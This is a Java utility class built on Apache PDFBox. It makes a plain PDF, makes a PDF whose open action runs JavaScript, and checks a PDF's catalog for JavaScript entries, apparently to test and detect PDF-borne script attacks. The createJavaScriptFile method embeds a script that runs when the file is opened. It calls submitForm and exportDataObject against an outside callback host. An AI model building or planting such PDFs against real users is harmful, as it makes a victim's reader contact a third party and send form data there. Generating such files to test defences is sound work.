package cn.moonlord.common.pdf;

import org.apache.pdfbox.cos.COSName;
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDDocumentCatalog;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.PDPageContentStream;
import org.apache.pdfbox.pdmodel.font.PDType1Font;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionJavaScript;

import java.io.File;
import java.io.IOException;

public class PdfXss {

    public static void createNormalFile(String fileSavePath) {
        try {
            new File((new File(fileSavePath)).getParent()).mkdirs();
            PDDocument document = new PDDocument();
            PDPage page = new PDPage();
            PDPageContentStream content = new PDPageContentStream(document, page);
            content.beginText();
            content.setFont(PDType1Font.TIMES_ROMAN, 14);
            content.showText("COSName{S}:COSName{JavaScript};COSName{JS}:COSString{ ... }");
            content.endText();
            content.close();
            document.addPage(page);
            document.save(fileSavePath);
            document.close();
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
    }

    public static void createJavaScriptFile(String fileSavePath) {
        try {
            new File((new File(fileSavePath)).getParent()).mkdirs();
            PDDocument document = new PDDocument();
            PDPage page = new PDPage();
            document.addPage(page);
            String javaScript = "app.alert( {cMsg: 'this is an example', nIcon: 3, nType: 0, cTitle: 'PDFBox Javascript example' } );\n" +
                "this.submitForm({ cURL: \"http://c3aae62fc7.ipv6.1433.eu.org\" });\n" +
                "this.exportDataObject({ cName: \"exportData\", nLaunch: 2, cDIPath: \"http://c3aae62fc7.ipv6.1433.eu.org\" });\n";
            PDActionJavaScript action = new PDActionJavaScript(javaScript);
            document.getDocumentCatalog().setOpenAction(action);
            document.save(fileSavePath);
            document.close();
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
    }

    public static boolean checkContainsJavaScript(String fileSavePath) {
        try {
            PDDocument document = PDDocument.load(new File(fileSavePath));
            PDDocumentCatalog pdDocumentCatalog = document.getDocumentCatalog();
            String catalog = pdDocumentCatalog.getCOSObject().toString();
            // example: COSName{S}:COSName{JavaScript};COSName{JS}:COSString{ ... }:
            if (catalog.contains(COSName.JAVA_SCRIPT.toString()) || catalog.contains(COSName.JS.toString())) {
                return true;
            }
        } catch (IOException e) {
            throw new IllegalArgumentException(e);
        }
        return false;
    }

}
